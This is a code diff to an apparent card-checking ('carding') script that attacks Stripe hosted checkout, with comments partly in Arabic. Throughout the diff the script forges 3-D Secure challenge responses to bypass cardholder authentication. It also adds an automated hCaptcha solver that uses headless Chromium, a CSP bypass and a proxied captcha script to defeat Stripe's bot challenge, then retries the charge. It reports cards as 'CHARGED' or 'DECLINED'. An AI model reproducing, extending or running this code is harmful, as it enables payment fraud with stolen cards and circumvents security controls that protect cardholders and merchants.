@@ -14,6 +14,7 @@ UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 
 SJUA = "stripe.js/da394b0aef; stripe-js-v3/da394b0aef; checkout"
 STRIPE_VER = "2020-08-27"
 HCK = "c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a"
+NKEY = ""
 
 class C:
     R="\033[0m";B="\033[1m";RED="\033[91m";GRN="\033[92m";YEL="\033[93m"
@@ -74,22 +75,6 @@ def forge_cres(a, s, pan="", ts="Y"):
             "challengeCompletionInd": "Y",
             "acsRenderingType": {"acsInterface": "01", "acsUiTemplate": "01"}}
 
-def _parse_form(html_text: str, base_url: str = ""):
-    action = None
-    m = re.search(r'<form[^>]+action=["\']([^"\']*)["\']', html_text, re.I)
-    if m:
-        raw_action = unquote(m.group(1)).strip()
-        if (not raw_action) or raw_action == "#": action = base_url
-        else: action = urljoin(base_url, raw_action) if base_url else raw_action
-    elif "<form" in html_text.lower(): action = base_url
-    fields = {}
-    for tag in re.finditer(r"<input[^>]+/?>", html_text, re.I):
-        t = tag.group(0)
-        n = re.search(r'name=["\']([^"\']+)["\']', t, re.I)
-        v = re.search(r'value=["\']([^"\']*)["\']', t, re.I)
-        if n: fields[n.group(1)] = unquote(v.group(1)) if v else ""
-    return action, fields
-
 def find_source_recursive(obj, depth=0, max_depth=12):
     if depth > max_depth: return None
     if isinstance(obj, str): return obj if obj.startswith(("src_", "tdsrc_", "pi_3ds_")) else None
@@ -107,6 +92,66 @@ def find_source_recursive(obj, depth=0, max_depth=12):
             r = find_source_recursive(item, depth + 1, max_depth)
             if r: return r
     return None
+
+# --- دالة Playwright (خطة بديلة للكابتشا) ---
+async def _run_playwright_hcaptcha(checkout_url, rqdata=None, sitekey=None):
+    if not sitekey:
+        return None
+    hc_file_path = "hc_script.js"
+    hc_script_text = ""
+    if os.path.exists(hc_file_path):
+        with open(hc_file_path, "r") as f: hc_script_text = f.read()
+    else:
+        session = AsyncSession(impersonate="chrome", timeout=15)
+        try:
+            r = await session.get("https://js-hcaptcha-com.translate.goog/1/api.js?render=explicit&_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en")
+            if r.status_code == 200:
+                hc_script_text = r.text
+                with open(hc_file_path, "w") as f: f.write(hc_script_text)
+        except: pass
+        finally: await session.close()
+
+    if not hc_script_text: return None
+
+    node_script = """
+    const { chromium } = require('playwright');
+    const fs = require('fs');
+    const url = process.argv[2], sitekey = process.argv[3], rqdata = process.argv[4], hc_file = process.argv[5];
+    const hc_script = fs.readFileSync(hc_file, 'utf8');
+    (async () => {
+        try {
+            const browser = await chromium.launch({ executablePath: '/usr/bin/chromium-browser', headless: true, args: ['--no-sandbox', '--disable-dev-shm-usage'] });
+            const context = await browser.newContext({ bypassCSP: true });
+            const page = await context.newPage();
+            await page.route('**/*hcaptcha*', async (route) => {
+                if (route.request().url().includes('api.js')) await route.fulfill({ status: 200, contentType: 'application/javascript', body: hc_script });
+                else await route.continue();
+            });
+            await page.goto(url, { waitUntil: 'domcontentloaded' });
+            try { await page.waitForFunction(() => typeof hcaptcha !== 'undefined', { timeout: 5000 }); } catch(e) { console.log("FAIL"); return; }
+            const token = await page.evaluate(async ({sitekey, rqdata}) => {
+                if (typeof hcaptcha === 'undefined') return 'undefined_hcaptcha';
+                return new Promise((resolve) => {
+                    const holder = document.createElement('div'); document.body.appendChild(holder);
+                    const wid = hcaptcha.render(holder, { sitekey, size: 'invisible', rqdata, callback: resolve, 'error-callback': (e) => resolve('error_' + e) });
+                    hcaptcha.execute(wid, {rqdata});
+                });
+            }, {sitekey, rqdata});
+            console.log(token);
+            await browser.close();
+        } catch (e) { console.log('FAIL'); }
+    })();
+    """
+    node_file_path = "solver.js"
+    with open(node_file_path, "w") as f: f.write(node_script)
+
+    try:
+        process = await asyncio.create_subprocess_exec("node", node_file_path, checkout_url, sitekey, (rqdata or ""), hc_file_path, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        stdout, _ = await asyncio.wait_for(process.communicate(), timeout=20.0)
+        out = stdout.decode().strip()
+        if out and len(out) > 50 and not out.startswith("error_"): return out
+        return None
+    except Exception: return None
 
 class StripeSession:
     def __init__(self, url):
@@ -193,7 +238,6 @@ class StripeSession:
         method_url = sdk.get("three_ds_method_url") or sdk.get("methodURL")
         notify_url = sdk.get("three_ds_method_notification_url") or "https://hooks.stripe.com/3ds2/fingerprint/complete"
         
-        # 1. Fingerprint
         if method_url and stid:
             log("3DS: fingerprint", C.CYN)
             method_obj = {"threeDSServerTransID": stid, "threeDSMethodNotificationURL": notify_url}
@@ -204,7 +248,6 @@ class StripeSession:
             except: pass
             await asyncio.sleep(1)
             
-        # 2. Authenticate Source
         src = find_source_recursive(sdk) or find_source_recursive(conf)
         if src:
             log("3DS: authenticate", C.CYN)
@@ -217,7 +260,6 @@ class StripeSession:
                 if st in ("succeeded","requires_capture"):
                     return {"success": True, "status": "CHARGED", "message": "3DS Frictionless OK", "raw": res}
                 
-                # 3. Challenge (CReq)
                 new_na = res.get("next_action") or {}
                 new_sdk = new_na.get("use_stripe_sdk") or new_na
                 acs_url = new_sdk.get("acs_url")
@@ -232,7 +274,6 @@ class StripeSession:
                     forged = forge_cres(acs_trans_id=acs_tid or stid, server_trans_id=stid, pan=card['cc'])
                     cres_b64 = b64e(json.dumps(forged, separators=(",", ":")).encode())
                     
-                    # Post forged CRes to Stripe
                     comp_body = {"key": self.pk, "source": src, "cres": cres_b64, "challenge_window_size": "05"}
                     cr = await self.session.post("https://api.stripe.com/v1/3ds2/challenge_complete", data=urlencode(comp_body), headers=hdr, timeout=12)
                     if cr.json().get("status") == "succeeded":
@@ -252,14 +293,17 @@ class StripeSession:
                 res["response_time"] = time.time() - t0; return res
             
             total = self.raw_amount; checksum = self.init_json.get("init_checksum", "")
+            
+            # الـ Payload الخاص بالراجل
             data = {
                 "payment_method": pm_id, "expected_payment_method_type": "card",
                 "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}", "key": self.pk,
-                "eid": "NA", "init_checksum": checksum,
+                "eid": "NA",
                 "client_attribution_metadata[client_session_id]": self.cs,
                 "client_attribution_metadata[merchant_integration_source]": "checkout",
                 "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
             }
+            if checksum: data["init_checksum"] = checksum
             if total > 0: data["expected_amount"] = total
                 
             r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs())
@@ -268,6 +312,19 @@ class StripeSession:
             
             if "error" in j:
                 err = j["error"]
+                # لو Stripe طلب كابتشا، هنا بنستخدم الكود بتاعنا
+                if "intent_confirmation_challenge" in str(err).lower():
+                    log("WAF Detected! Calling Playwright...", C.GOLD)
+                    site_key = self.init_json.get("passive_captcha", {}).get("site_key", HCK)
+                    rqdata = err.get("next_action", {}).get("use_stripe_sdk", {}).get("stripe_js", {}).get("rqdata")
+                    token = await _run_playwright_hcaptcha(self.url, rqdata, site_key)
+                    if token:
+                        v_body = {"key": self.pk, "client_secret": err.get("payment_intent", {}).get("client_secret", ""), "captcha_response": token}
+                        v_r = await self.session.post(f"https://api.stripe.com/v1/payment_intents/{err.get('payment_intent', {}).get('id')}/verify_challenge", data=v_body, headers=self._hdrs())
+                        j = v_r.json()
+                        if "error" not in j:
+                            return await self.charge(card) # إعادة المحاولة بعد الكابتشا
+                
                 res["status"] = "DECLINED"
                 res["message"] = f"{err.get('code', '').upper()}: {err.get('message', '')}"
                 return res
